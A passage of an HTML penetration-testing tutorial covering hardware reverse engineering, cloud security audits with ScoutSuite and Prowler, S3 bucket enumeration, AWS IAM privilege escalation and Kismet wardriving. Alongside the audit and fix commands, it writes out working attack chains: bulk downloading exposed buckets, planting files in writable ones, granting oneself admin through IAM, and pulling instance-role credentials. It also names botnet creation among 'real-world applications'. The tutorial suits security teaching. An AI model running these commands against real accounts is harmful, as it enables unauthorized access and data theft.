# - Admin passwords in /etc/shadow
# - API keys in /etc/api.conf
# - Backdoor accounts in /etc/passwd</div>

            <h3>Hardware Reverse Engineering</h3>

            <h4>Identifying Chips</h4>

            <div class="code"># Every chip has markings. Learn to read them:

# Example marking: "STM32F103C8T6"
# STM = Manufacturer (STMicroelectronics)
# 32 = Product line (32-bit)
# F = Family (Foundation)
# 103 = Model number
# C8 = Flash size (64KB)
# T6 = Package type and temperature range

# Google the full part number to find:
# - Datasheet (pinout, specifications)
# - Application notes (how to use it)
# - Community resources (hacks, exploits)

# Common manufacturer codes:
# STM = STMicroelectronics (MCUs)
# ESP = Espressif (WiFi chips)
# ATmega = Atmel/Microchip (Arduino MCUs)
# BCM = Broadcom (networking chips)
# MT = MediaTek (WiFi/Bluetooth)
# W25Q = Winbond (flash memory)

# If markings are scratched off or illegible:
# 1. Measure package dimensions
# 2. Count pins
# 3. Trace PCB connections
# 4. Use multimeter to identify power/ground
# 5. Google similar devices for clues</div>

            <h4>PCB Reverse Engineering</h4>

            <div class="code"># Steps to reverse engineer a circuit board:

# 1. High-resolution photos (both sides)
# Use good lighting, steady camera
# Take multiple angles

# 2. Identify components
# Look up all chip part numbers
# Create component list

# 3. Trace connections with multimeter
# Continuity mode: beep = connected
# Map which pins connect to what

# 4. Draw schematic (optional but helpful)
# Use KiCad, Eagle, or pen+paper
# Document power, ground, signal connections

# 5. Find interesting test points
# Look for unpopulated headers
# Probe with oscilloscope/logic analyzer
# Identify communication protocols

# Tools for PCB analysis:
# • Multimeter ($20-100)
# • Logic analyzer ($10-200)
#   - Cheap: Saleae clones ($10)
#   - Pro: Saleae Logic Pro ($500)
# • Oscilloscope ($100-1000+)
#   - Entry: Rigol DS1054Z ($400)
#   - Budget: Hantek DSO2D15 ($200)
# • Microscope (USB microscope, $30-100)
# • Hot air station (for desoldering, $50-150)

# Logic analyzer usage example:
# Connect probes to suspected UART TX pin
# Set trigger: Rising edge
# Capture during device boot
# Analyze with PulseView/Sigrok:
pulseview

# Protocol decoder: UART
# Baud rate: Auto-detect or try common rates
# View decoded text: You see boot messages!</div>

            <div class="metaphor-box">
                <h4>🎉 You're Now a Hardware Hacker!</h4>
                <p>You've learned:<br><br>
                ✅ <strong>UART:</strong> Serial console access, finding pins, connecting adapters<br>
                ✅ <strong>JTAG:</strong> Complete processor control, firmware dumping with OpenOCD<br>
                ✅ <strong>SPI:</strong> Flash memory extraction, chip programming<br>
                ✅ <strong>I2C:</strong> EEPROM reading/writing, configuration manipulation<br>
                ✅ <strong>Bus Pirate:</strong> Multi-protocol swiss army knife<br>
                ✅ <strong>Arduino/Pi:</strong> Custom hardware attacks, portable platforms<br>
                ✅ <strong>Firmware extraction:</strong> Binwalk, flashrom, bootloader dumps<br>
                ✅ <strong>Hardware RE:</strong> Chip identification, PCB tracing, protocol analysis<br><br>
                <strong>Real-world applications:</strong><br>
                • Smart lock bypass (UART root shell)<br>
                • Security camera firmware extraction (hardcoded admin password)<br>
                • Industrial controller exploitation (exposed JTAG)<br>
                • IoT botnet creation (compromised firmware)<br>
                • Physical implants (Raspberry Pi drop box)<br><br>
                <strong>Next steps:</strong><br>
                • Buy a cheap IoT device (security camera, smart plug)<br>
                • Open it up, find UART pins<br>
                • Connect, get root shell<br>
                • Extract firmware with binwalk<br>
                • Find hardcoded credentials<br>
                • Modify firmware, reflash<br><br>
                Hardware hacking is incredibly rewarding. You're not just typing commands—you're physically interacting with circuits, chips, and signals. It's hacking you can TOUCH! 🔧⚡</p>
            </div>
        </section>

        <!-- SECTION 4: Cloud Penetration Testing -->
        <section id="cloud-pentesting" class="section">
            <h2 class="section-title">Cloud Penetration Testing</h2>
            <p class="section-intro">The cloud isn't someone else's computer—it's someone else's MASSIVE infrastructure that you need to secure! AWS, Azure, Google Cloud... these platforms run millions of companies' critical data. One misconfigured S3 bucket = data breach. One overprivileged IAM role = complete account takeover. Traditional network pentesting skills don't directly translate to cloud—you need to understand IAM policies, storage permissions, serverless functions, container orchestration, and cloud-specific attack vectors. In this section, you'll learn to assess cloud security like a pro, find misconfigurations that lead to breaches, and exploit the unique vulnerabilities of cloud environments!</p>

            <div class="metaphor-box">
                <h4>💡 Cloud Pentesting = Auditing a Massive Apartment Complex</h4>
                <p>Imagine AWS as a HUGE apartment building with millions of units (resources). Each tenant (customer) has:<br><br>
                <strong>• Keys (IAM credentials):</strong> Some tenants give master keys to janitors (overprivileged roles)<br>
                <strong>• Storage units (S3 buckets):</strong> Some leave them unlocked (public read access)<br>
                <strong>• Doors (security groups):</strong> Some leave front doors wide open (0.0.0.0/0)<br>
                <strong>• Shared spaces (public snapshots):</strong> Accidentally shared with everyone<br><br>
                Your job as a cloud pentester:<br>
                • Find unlocked doors (exposed services)<br>
                • Test if janitor keys work on penthouse units (privilege escalation)<br>
                • Check storage units for sensitive data (S3 enumeration)<br>
                • Look for shared items that shouldn't be (snapshot/AMI exposure)<br><br>
                Cloud security is about CONFIGURATION, not exploiting software vulnerabilities!</p>
            </div>

            <h3>Understanding Cloud Security Models</h3>

            <h4>The Shared Responsibility Model</h4>

            <div class="info-box">
                <h4>Who Secures What?</h4>
                <p><strong>Cloud Provider's Responsibility (AWS/Azure/GCP):</strong><br>
                • Physical security of data centers<br>
                • Hardware maintenance<br>
                • Network infrastructure<br>
                • Hypervisor security<br>
                • Managed service security<br><br>
                <strong>Customer's Responsibility (YOU!):</strong><br>
                • IAM policies and user management<br>
                • Data encryption<br>
                • Network configuration (security groups, NACLs)<br>
                • Operating system patches<br>
                • Application security<br>
                • S3 bucket permissions<br>
                • Database access controls<br><br>
                <strong>The problem:</strong> Most breaches happen because customers misconfigure THEIR part—not because of cloud provider failures. That's what you're testing for!</p>
            </div>

            <h3>AWS Security Assessment with ScoutSuite</h3>

            <p><strong>ScoutSuite</strong> is a multi-cloud security auditing tool (formerly Scout2). It scans your AWS/Azure/GCP environment and generates a comprehensive HTML report of security issues.</p>

            <div class="code"># Install ScoutSuite:
pip3 install scoutsuite

# Or from GitHub:
git clone https://github.com/nccgroup/ScoutSuite
cd ScoutSuite
pip3 install -r requirements.txt

# Verify installation:
scout --help

# Output:
# usage: scout [-h] {aws,azure,gcp,aliyun,oci} ...
# 
# Scout Suite - Multi-Cloud Security Auditing Tool</div>

            <h4>Running ScoutSuite Against AWS</h4>

            <div class="code"># Prerequisites: AWS credentials configured
# Method 1: AWS CLI credentials file (~/.aws/credentials)
aws configure

# AWS Access Key ID: AKIA...
# AWS Secret Access Key: ...
# Default region name: us-east-1
# Default output format: json

# Method 2: Environment variables
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_DEFAULT_REGION="us-east-1"

# Method 3: IAM role (if running on EC2 instance)
# Automatically uses instance profile

# Run ScoutSuite AWS scan:
scout aws

# Output (during scan):
# [*] Collecting data from AWS API...
# [*] Fetching IAM data...
# [*] Fetching EC2 data...
# [*] Fetching S3 data...
# [*] Fetching RDS data...
# [*] Fetching Lambda data...
# [*] Analyzing findings...
# [*] Generating report...
# [+] Report saved to: scoutsuite-report/aws-<account-id>.html

# Open the report:
firefox scoutsuite-report/aws-*.html

# Advanced options:

# Scan specific services only:
scout aws --services s3 ec2 iam

# Use specific AWS profile:
scout aws --profile production

# Save report to custom location:
scout aws --report-dir /tmp/cloud-audit/

# Scan multiple regions:
scout aws --regions us-east-1 us-west-2 eu-west-1

# Exclude certain checks:
scout aws --skip-findings s3-bucket-no-logging

# Resume interrupted scan:
scout aws --resume</div>

            <h4>Understanding ScoutSuite Findings</h4>

            <div class="code"># ScoutSuite report shows findings categorized by service:

# Example findings:

# 🔴 DANGER - S3 Buckets with Public Read Access
# Bucket Name: company-backups
# Issue: Bucket allows public read access
# Risk: Anyone on the internet can download all files
# Recommendation: Remove public access, use bucket policies
# 
# How to verify:
aws s3api get-bucket-acl --bucket company-backups

# How to fix:
aws s3api put-public-access-block --bucket company-backups --public-access-block-configuration "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"

# 🔴 DANGER - IAM Users with Admin Access
# User: backup-script
# Issue: User has AdministratorAccess policy attached
# Risk: Compromise of these credentials = full account takeover
# Recommendation: Use principle of least privilege
# 
# How to check:
aws iam list-attached-user-policies --user-name backup-script

# How to fix:
# Create custom policy with only needed permissions
# Attach specific policy, remove AdministratorAccess

# 🟡 WARNING - Security Groups Allow 0.0.0.0/0 SSH Access
# Security Group: sg-0a1b2c3d
# Issue: Port 22 open to entire internet
# Risk: Brute-force attacks, credential stuffing
# Recommendation: Restrict to specific IP ranges
# 
# How to check:
aws ec2 describe-security-groups --group-ids sg-0a1b2c3d

# How to fix:
aws ec2 revoke-security-group-ingress --group-id sg-0a1b2c3d --protocol tcp --port 22 --cidr 0.0.0.0/0
aws ec2 authorize-security-group-ingress --group-id sg-0a1b2c3d --protocol tcp --port 22 --cidr 1.2.3.4/32

# 🟡 WARNING - RDS Databases Not Encrypted
# Database: production-db
# Issue: Storage encryption disabled
# Risk: Data at rest not protected
# Recommendation: Enable encryption (requires recreation)

# 🟡 WARNING - Root Account MFA Not Enabled
# Issue: Root account doesn't have multi-factor authentication
# Risk: Stolen password = complete account compromise
# Recommendation: Enable virtual or hardware MFA

# 🟢 INFO - CloudTrail Not Enabled in All Regions
# Issue: API activity not logged in some regions
# Risk: Attacker actions might not be detected
# Recommendation: Enable CloudTrail in all regions</div>

            <h3>Prowler - AWS Security Best Practices Auditor</h3>

            <p><strong>Prowler</strong> is a command-line tool that performs AWS security assessments based on CIS Amazon Web Services Foundations Benchmark. It runs 200+ checks!</p>

            <div class="code"># Install Prowler:
pip3 install prowler

# Or use Docker:
docker pull toniblyx/prowler

# Run basic scan:
prowler aws

# Output (live during scan):
# Check 1.1 [check11] Avoid use of "root" account ... [OK]
# Check 1.2 [check12] Ensure MFA is enabled for "root" account ... [FAIL]
# Check 1.3 [check13] Ensure credentials unused for 90 days are disabled ... [OK]
# Check 2.1 [check21] Ensure CloudTrail is enabled in all regions ... [FAIL]
# Check 2.2 [check22] Ensure CloudTrail log file validation is enabled ... [OK]
# [... 200+ checks ...]

# Run specific check group:
prowler aws -g check1,check2
# Only IAM checks (group 1) and CloudTrail checks (group 2)

# Run specific checks:
prowler aws -c check11,check12,check21

# Generate HTML report:
prowler aws -M html

# Output files:
# prowler-output-<account-id>-<date>.html
# prowler-output-<account-id>-<date>.json
# prowler-output-<account-id>-<date>.csv

# Scan specific regions:
prowler aws -f us-east-1,us-west-2

# Exclude specific checks:
prowler aws -e check11,check22

# Use specific AWS profile:
prowler aws -p production

# Run in quiet mode (only show failures):
prowler aws -q

# Save results to S3:
prowler aws -B s3://my-prowler-reports/

# Run with custom checks:
prowler aws -x /path/to/custom_checks/</div>

            <h4>Key Prowler Checks (CIS Benchmark)</h4>

            <div class="code"># Identity and Access Management (Group 1):
# • 1.1: Avoid root account usage
# • 1.2: MFA enabled for root
# • 1.3: Disable unused credentials (90+ days)
# • 1.4: Access keys rotated every 90 days
# • 1.5: Password policy requires uppercase
# • 1.6: Password policy requires lowercase
# • 1.7: Password policy requires symbols
# • 1.8: Password policy requires numbers
# • 1.9: Password policy minimum length 14
# • 1.10: Password reuse prevention
# • 1.11: Password expiration 90 days
# • 1.12-1.22: Various IAM policy checks

# Logging (Group 2):
# • 2.1: CloudTrail enabled in all regions
# • 2.2: CloudTrail log file validation enabled
# • 2.3: S3 bucket for CloudTrail not public
# • 2.4: CloudTrail integrated with CloudWatch Logs
# • 2.5: AWS Config enabled in all regions
# • 2.6: S3 bucket logging enabled for CloudTrail
# • 2.7: CloudTrail logs encrypted with KMS
# • 2.8: KMS key rotation enabled
# • 2.9: VPC Flow Logging enabled

# Monitoring (Group 3):
# • 3.1-3.14: CloudWatch alarms for suspicious activity
#   - Unauthorized API calls
#   - Console sign-in without MFA
#   - Root account usage
#   - IAM policy changes
#   - CloudTrail configuration changes
#   - Failed console authentication
#   - Security group changes
#   - NACL changes
#   - Network gateway changes
#   - Route table changes
#   - VPC changes

# Networking (Group 4):
# • 4.1: Security groups don't allow 0.0.0.0/0 ingress on port 22
# • 4.2: Security groups don't allow 0.0.0.0/0 ingress on port 3389
# • 4.3: VPC default security group restricts all traffic

# Additional AWS checks (Group 7):
# • S3 bucket versioning enabled
# • S3 bucket MFA delete enabled
# • S3 bucket encryption enabled
# • ELB listener using HTTPS/TLS
# • RDS encryption enabled
# • RDS backup retention period > 7 days
# • RDS multi-AZ enabled
# • Lambda functions not public
# • EC2 instances use IMDSv2</div>

            <h3>S3 Bucket Enumeration & Exploitation</h3>

            <h4>Finding Public S3 Buckets</h4>

            <div class="code"># S3 bucket naming patterns to try:
# company-name
# companyname
# company-backups
# company-logs
# company-prod
# company-dev
# company-staging
# www.company.com
# company.com

# Method 1: Direct URL access
curl http://company-backups.s3.amazonaws.com

# If bucket exists and allows listing:
# <?xml version="1.0" encoding="UTF-8"?>
# <ListBucketResult>
#   <Name>company-backups</Name>
#   <Contents>
#     <Key>database-dump.sql</Key>
#     <Key>credentials.txt</Key>
#   </Contents>
# </ListBucketResult>

# Method 2: Using AWS CLI
aws s3 ls s3://company-backups

# If public:
# 2026-01-07 10:00:00  1048576 database-dump.sql
# 2026-01-07 11:30:00     1024 credentials.txt

# Download all files:
aws s3 sync s3://company-backups ./downloaded-data/

# Method 3: Using s3scanner
# https://github.com/sa7mon/S3Scanner
pip3 install s3scanner

# Scan list of potential buckets:
echo "company-backups
company-logs
company-prod
company-dev" > buckets.txt

s3scanner scan --buckets-file buckets.txt

# Output:
# [+] company-backups - PUBLIC - ListBucket
# [+] company-logs - PUBLIC - ListBucket, GetObject
# [-] company-prod - NOT_EXIST
# [-] company-dev - FORBIDDEN

# Method 4: Google Dorking for S3 buckets
# Search: site:s3.amazonaws.com "company name"
# Search: site:s3.amazonaws.com intitle:"Index of"
# Search: inurl:s3.amazonaws.com filetype:pdf confidential

# Method 5: Using bucket-stream (real-time monitoring)
# https://github.com/eth0izzle/bucket-stream
git clone https://github.com/eth0izzle/bucket-stream
cd bucket-stream
pip3 install -r requirements.txt

# Monitor certstream for new S3 buckets:
python3 bucket-stream.py

# Output (live stream):
# [+] company-backup.s3.amazonaws.com - PUBLIC
# [+] startup-logs.s3.amazonaws.com - PUBLIC</div>

            <h4>Exploiting S3 Misconfigurations</h4>

            <div class="code"># Common S3 misconfigurations:

# 1. Public Read Access (COMMON)
# Anyone can list and download files
aws s3 ls s3://vulnerable-bucket/
aws s3 cp s3://vulnerable-bucket/secrets.txt ./

# 2. Public Write Access (RARE but CRITICAL)
# Anyone can upload files!
echo "hacked" > test.txt
aws s3 cp test.txt s3://vulnerable-bucket/

# Exploitation scenario:
# - Upload web shell to bucket
# - If bucket serves website, execute shell
# - Or: Upload malicious files for phishing

# 3. Authenticated Read (AWS account required, any account works)
# Not public, but any AWS user can access
aws s3 ls s3://authenticated-bucket/ --profile my-aws-account

# 4. Object-level permissions (each file has its own ACL)
# Bucket might be private, but individual objects are public
aws s3api get-object-acl --bucket company-bucket --key sensitive.pdf

# Output:
# "Grantee": {
#   "Type": "Group",
#   "URI": "http://acs.amazonaws.com/groups/global/AllUsers"
# }
# ← This file is public even if bucket isn't!

# 5. Bucket policies allowing specific actions
aws s3api get-bucket-policy --bucket company-bucket

# Policy might allow:
# - GetObject from any IP (download files)
# - PutObject from specific IPs (upload if you're in range)
# - DeleteObject (catastrophic!)

# Checking bucket ACL:
aws s3api get-bucket-acl --bucket target-bucket

# Output showing public access:
# "Grantee": {
#   "Type": "Group",
#   "URI": "http://acs.amazonaws.com/groups/global/AllUsers"
# },
# "Permission": "READ"

# Checking bucket policy:
aws s3api get-bucket-policy --bucket target-bucket --query Policy --output text | jq

# Impact of S3 exposure:
# • Data breach (customer data, PII)
# • Credential theft (AWS keys, API tokens)
# • Source code disclosure
# • Database backups
# • Internal documents
# • Intellectual property</div>

            <h3>IAM Privilege Escalation</h3>

            <p>IAM (Identity and Access Management) misconfigurations can allow attackers to escalate privileges from low-privileged access to admin!</p>

            <h4>Common IAM Privilege Escalation Vectors</h4>

            <div class="code"># 1. iam:CreateAccessKey on other users
# If you can create access keys for other users, compromise their accounts!

# List all users:
aws iam list-users

# Create access key for admin user:
aws iam create-access-key --user-name admin

# Output:
# {
#   "AccessKey": {
#     "AccessKeyId": "AKIA...",
#     "SecretAccessKey": "..."
#   }
# }

# Now use admin's credentials!
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."

# You're now admin!

# 2. iam:AttachUserPolicy or iam:AttachRolePolicy
# Attach AdministratorAccess policy to yourself!

aws iam attach-user-policy --user-name my-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# You're now admin!

# 3. iam:PutUserPolicy
# Create inline policy granting admin access

aws iam put-user-policy --user-name my-user --policy-name AdminPolicy --policy-document '{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
  }]
}'

# 4. iam:CreatePolicyVersion
# If you can modify existing policies attached to privileged roles

aws iam create-policy-version --policy-arn arn:aws:iam::123456789012:policy/CustomPolicy --policy-document '{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
  }]
}' --set-as-default

# 5. sts:AssumeRole
# If you can assume a privileged role

aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name exploit

# Use returned credentials to act as AdminRole

# 6. iam:PassRole + ec2:RunInstances
# Launch EC2 instance with privileged instance profile, then access from instance

aws ec2 run-instances --image-id ami-12345678 --instance-type t2.micro --iam-instance-profile Name=AdminInstanceProfile

# SSH into instance, credentials auto-loaded:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminInstanceProfile

# 7. lambda:CreateFunction + iam:PassRole
# Create Lambda function with privileged role, execute it

aws lambda create-function --function-name exploit --runtime python3.9 --role arn:aws:iam::123456789012:role/AdminRole --handler lambda_function.lambda_handler --zip-file fileb://exploit.zip

aws lambda invoke --function-name exploit output.txt

# Lambda runs with AdminRole permissions!

# 8. iam:UpdateAssumeRolePolicy
# Modify trust policy to allow yourself to assume role

aws iam update-assume-role-policy --role-name AdminRole --policy-document '{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::123456789012:user/my-user"},
    "Action": "sts:AssumeRole"
  }]
}'

# Now assume the role:
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name pwned</div>

            <h4>Automated IAM Enumeration</h4>

            <div class="code"># enumerate-iam (identify permissions)
# https://github.com/andresriancho/enumerate-iam

pip3 install enumerate-iam

# Run enumeration:
enumerate-iam --access-key AKIA... --secret-key ...

# Output:
# [+] Testing IAM permissions...
# [+] iam:GetUser - SUCCESS
# [+] iam:ListUsers - DENIED
# [+] iam:ListRoles - SUCCESS
# [+] ec2:DescribeInstances - SUCCESS
# [+] s3:ListAllMyBuckets - SUCCESS
# [+] s3:GetObject - SUCCESS (on bucket: company-data)

# CloudMapper (visualize AWS environment)
# https://github.com/duo-labs/cloudmapper

git clone https://github.com/duo-labs/cloudmapper
cd cloudmapper
pip3 install -r requirements.txt

# Configure:
python3 cloudmapper.py configure add-account --config-file config.json --name prod --id 123456789012

# Collect data:
python3 cloudmapper.py collect --account prod

# Generate visualization:
python3 cloudmapper.py prepare --account prod
python3 cloudmapper.py webserver

# Open http://localhost:8000 - see full AWS environment map!

# Pacu (AWS exploitation framework)
# https://github.com/RhinoSecurityLabs/pacu

git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
pip3 install -r requirements.txt
python3 pacu.py

# Inside Pacu:
Pacu > import_keys access_key_id secret_access_key
Pacu > run iam__enum_permissions
Pacu > run iam__privesc_scan
Pacu > run s3__bucket_finder

# Pacu has 50+ modules for AWS exploitation!</div>

            <h3>Azure & GCP Security Assessment</h3>

            <h4>Azure with ScoutSuite</h4>

            <div class="code"># Azure requires service principal or CLI authentication

# Method 1: Azure CLI (recommended)
az login

# Method 2: Service principal
export AZURE_SUBSCRIPTION_ID="..."
export AZURE_TENANT_ID="..."
export AZURE_CLIENT_ID="..."
export AZURE_CLIENT_SECRET="..."

# Run ScoutSuite:
scout azure

# Key Azure findings:
# • Storage accounts allowing public blob access
# • Network security groups with 0.0.0.0/0 rules
# • Virtual machines without encryption
# • Key vaults without access policies
# • SQL databases without firewall rules
# • App Services allowing HTTP (not HTTPS)

# Azure-specific tools:

# ROADtools (Azure AD enumeration)
pip3 install roadrecon

# Authenticate:
roadrecon auth --access-token <token>

# Gather data:
roadrecon gather

# Analyze in GUI:
roadrecon gui

# MicroBurst (Azure security assessment)
git clone https://github.com/NetSPI/MicroBurst
cd MicroBurst
Import-Module .\MicroBurst.psm1

# Enumerate:
Invoke-EnumerateAzureBlobs -Base company
Invoke-EnumerateAzureSubDomains -Base company

# Find storage accounts:
# company.blob.core.windows.net
# company-backups.blob.core.windows.net</div>

            <h4>GCP with ScoutSuite</h4>

            <div class="code"># GCP requires service account or gcloud authentication

# Authenticate with gcloud:
gcloud auth login
gcloud auth application-default login

# Run ScoutSuite:
scout gcp --project-id my-project-123

# Key GCP findings:
# • GCS buckets with allUsers permission
# • Compute instances with default service accounts
# • Firewall rules allowing 0.0.0.0/0
# • Cloud SQL instances publicly accessible
# • IAM service accounts with excessive permissions
# • Cloud Functions with public invoker role

# GCP-specific tools:

# GCP IAM Privilege Escalation (similar to AWS)
# • roles/iam.serviceAccountUser - impersonate service accounts
# • roles/iam.serviceAccountKeyAdmin - create service account keys
# • roles/compute.instanceAdmin - create instances with service accounts

# Enumerate GCS buckets:
gsutil ls

# Check bucket permissions:
gsutil iam get gs://company-bucket

# If "allUsers" or "allAuthenticatedUsers" present = public!

# Download bucket contents:
gsutil -m cp -r gs://company-bucket/* ./downloaded/</div>

            <div class="metaphor-box">
                <h4>🎉 You're Now a Cloud Security Expert!</h4>
                <p>You've mastered:<br><br>
                ✅ <strong>ScoutSuite:</strong> Multi-cloud automated security assessment<br>
                ✅ <strong>Prowler:</strong> AWS CIS benchmark auditing (200+ checks)<br>
                ✅ <strong>S3 Enumeration:</strong> Finding and exploiting public buckets<br>
                ✅ <strong>IAM Exploitation:</strong> 8+ privilege escalation techniques<br>
                ✅ <strong>Azure Security:</strong> Storage accounts, NSGs, Key Vaults<br>
                ✅ <strong>GCP Security:</strong> GCS buckets, IAM, Compute instances<br><br>
                <strong>The Cloud Pentester's Mindset:</strong><br>
                • <strong>Think configurations, not exploits:</strong> 99% of cloud breaches are misconfigurations<br>
                • <strong>Automate everything:</strong> Environments are too large for manual testing<br>
                • <strong>Understand IAM deeply:</strong> Identity is the new perimeter<br>
                • <strong>Check the obvious first:</strong> Public S3 buckets, 0.0.0.0/0 security groups<br>
                • <strong>Map the environment:</strong> Know what you're testing before diving deep<br><br>
                <strong>Real-world cloud breaches:</strong><br>
                • Capital One (2019): SSRF + overprivileged IAM role = 100M records<br>
                • Uber (2016): GitHub credentials in S3 bucket = full AWS compromise<br>
                • Dow Jones (2017): Public S3 bucket = 2.2M customer records exposed<br>
                • Tesla (2018): Public Kubernetes dashboard = cryptomining in cloud<br><br>
                <strong>Practice resources:</strong><br>
                • <strong>CloudGoat:</strong> Vulnerable-by-design AWS environment<br>
                • <strong>flAWS.cloud:</strong> AWS security challenges<br>
                • <strong>AWSGoat:</strong> Vulnerable AWS infrastructure<br>
                • <strong>GCP-Goat:</strong> Vulnerable GCP environment<br><br>
                Cloud security is THE fastest-growing pentesting specialty. Companies are desperate for people who understand IAM, storage permissions, and cloud-native security. Master this = job security for life! ☁️🔐</p>
            </div>
        </section>

        <section id="advanced-wireless" class="section">
            <h2 class="section-title">Advanced Wireless Techniques</h2>
            <p class="section-intro">Wireless networks are everywhere—invisible highways carrying data through the air. WiFi at coffee shops, Bluetooth headphones, RFID access badges, NFC payment cards, ZigBee smart home devices, 433MHz garage door openers... every wireless protocol is a potential attack vector. In Bonus B1, we covered basic WiFi hacking (aircrack-ng, airodump-ng, WPA cracking). Now we go DEEP: advanced monitoring with Kismet, social engineering attacks with Wifiphisher, WPA3 cracking, Bluetooth exploitation, RFID cloning, and radio frequency analysis. This section transforms you from WiFi script kiddie to wireless penetration expert!</p>

            <div class="metaphor-box">
                <h4>💡 Wireless Hacking = Being an Invisible Spy</h4>
                <p>Imagine the air around you is filled with invisible conversations. Every WiFi network, Bluetooth device, and RFID card is constantly broadcasting. Traditional hackers need physical access or internet connections. Wireless hackers just need to be nearby!<br><br>
                <strong>With the right tools, you can:</strong><br>
                • Listen to WiFi handshakes from 100+ meters away<br>
                • Capture Bluetooth keyboard keystrokes<br>
                • Clone RFID access badges by walking past someone<br>
                • Intercept car key fob signals and replay them<br>
                • Create fake WiFi networks that look legitimate<br>
                • Jam wireless signals to cause denial of service<br><br>
                Wireless hacking is powerful because victims don't know they're being attacked. No cables, no physical access, no traces!</p>
            </div>

            <h3>Part 1: Kismet - Advanced WiFi/Bluetooth Detection & Monitoring</h3>

            <p><strong>Kismet</strong> is a powerful wireless network detector, sniffer, and intrusion detection system. Unlike airodump-ng (which focuses on one network at a time), Kismet passively monitors ALL wireless traffic on all channels simultaneously!</p>

            <div class="info-box">
                <h4>Why Kismet > airodump-ng?</h4>
                <p><strong>Kismet advantages:</strong><br>
                • <strong>Channel hopping:</strong> Monitors all WiFi channels at once (airodump-ng locks to one)<br>
                • <strong>Web interface:</strong> Beautiful real-time dashboard with graphs and maps<br>
                • <strong>Bluetooth support:</strong> Detects BLE, BTLE, and classic Bluetooth<br>
                • <strong>GPS integration:</strong> Maps access point locations (wardriving!)<br>
                • <strong>Historical data:</strong> Tracks networks over time, detects patterns<br>
                • <strong>Plugin system:</strong> Extensible with Python plugins<br>
                • <strong>Hidden SSID detection:</strong> Reveals hidden networks via client probes<br>
                • <strong>Rogue AP detection:</strong> Identifies evil twin attacks<br><br>
                <strong>Use airodump-ng for:</strong> Targeted attacks on specific networks<br>
                <strong>Use Kismet for:</strong> Passive reconnaissance, wardriving, comprehensive monitoring</p>
            </div>

            <h4>Installing Kismet</h4>

            <div class="code"># Kismet comes with Kali, but here's how to update:
sudo apt update
sudo apt install kismet

# Verify installation:
kismet --version

# Output:
# Kismet 2024.07.01

# Add your user to kismet group (avoid running as root):
sudo usermod -aG kismet $USER

# Log out and back in for group change to take effect

# Start Kismet:
kismet

# Output:
# INFO: Kismet starting...
# INFO: Creating web server on http://localhost:2501
# INFO: Kismet server listening on http://localhost:2501
# 
# Open your browser to: http://localhost:2501</div>

            <h4>Kismet Web Interface Walkthrough</h4>

            <div class="code"># When you open http://localhost:2501:

# First-time setup:
# 1. Create admin user and password
# 2. Select data sources (WiFi adapters)

# Main Dashboard shows:
# • Total networks detected
# • Total devices detected
# • Channel distribution graph
# • Signal strength over time
# • Recent activity feed

# Key tabs:

# 1. DEVICES tab:
# Shows all detected WiFi networks and clients
# Columns:
#   - Name (SSID)
#   - Type (AP, Client, Bridge)
#   - Channel
#   - Encryption (WPA2, WPA3, Open)
#   - Signal strength
#   - First seen / Last seen
#   - Manufacturer (from MAC OUI)

# Click any device to see detailed info:
#   - Full MAC address
#   - Beacon frames captured
#   - Data packets
#   - Connected clients
#   - GPS coordinates (if GPS enabled)
#   - Historical signal strength graph

# 2. CHANNEL USAGE:
# Shows which channels are most crowded
# Helps identify least-used channels for attacks

# 3. DATASOURCES:
# Manage WiFi adapters
# Add/remove interfaces
# See packet capture rates

# 4. PLUGINS:
# Enable/disable Kismet plugins
# Install new plugins

# 5. ALERTS:
# Security alerts:
#   - Rogue AP detected
#   - Deauth flood detected
#   - GPS spoofing detected
#   - Bluetooth scanning attacks</div>

            <h4>Kismet Command-Line Usage</h4>

            <div class="code"># Start Kismet with specific adapter:
kismet -c wlan0

# Start with multiple adapters:
kismet -c wlan0 -c wlan1

# Enable GPS:
kismet -c wlan0 --use-gpsd

# Specify output directory:
kismet -c wlan0 --log-prefix /root/kismet-logs/

# Run in quiet mode (no web interface):
kismet -c wlan0 --no-ncurses --no-webui

# Capture only specific channels:
kismet -c wlan0:channels="1,6,11"

# Capture 5GHz only:
kismet -c wlan0:channels="36,40,44,48"

# Set GPS location manually (no GPS device):
kismet -c wlan0 --override-gps-lat 40.7128 --override-gps-lon -74.0060

# Enable Bluetooth:
kismet -c hci0:name=bluetooth

# All wireless protocols at once:
kismet -c wlan0 -c hci0</div>

            <h4>Wardriving with Kismet</h4>

            <div class="code"># Wardriving = driving around mapping WiFi networks

# Hardware needed:
# • Laptop with Kali
# • High-gain WiFi adapter (Alfa AWUS036ACH recommended)
# • GPS dongle (GlobalSat BU-353 or phone GPS via Bluetooth)
# • Car power inverter or large battery pack

# Setup GPS:
# Install gpsd:
sudo apt install gpsd gpsd-clients

# Connect GPS dongle, then:
sudo gpsd /dev/ttyUSB0 -F /var/run/gpsd.sock

# Verify GPS:
cgps

# You should see satellites and coordinates

# Start Kismet with GPS:
kismet -c wlan0 --use-gpsd

# Drive around for hours!
# Kismet logs everything to: ~/.kismet/logs/

# After wardriving session:
# Kismet creates files:
#   - Kismet-YYYYMMDD-HH-MM-SS-1.kismet (database)
#   - Kismet-YYYYMMDD-HH-MM-SS-1.pcapng (packet capture)
#   - Kismet-YYYYMMDD-HH-MM-SS-1.log (text log)

# Convert Kismet logs to KML (Google Earth):
kismetdb_to_kml --in Kismet-20260108-10-00-00-1.kismet --out networks.kml

# Open in Google Earth to see all networks on map!

# Export to CSV for analysis:
kismetdb_to_csv --in Kismet-20260108-10-00-00-1.kismet --out networks.csv

# Analyze CSV with Python/Excel:
# Find most common SSIDs, weakest encryption, high-value targets</div>

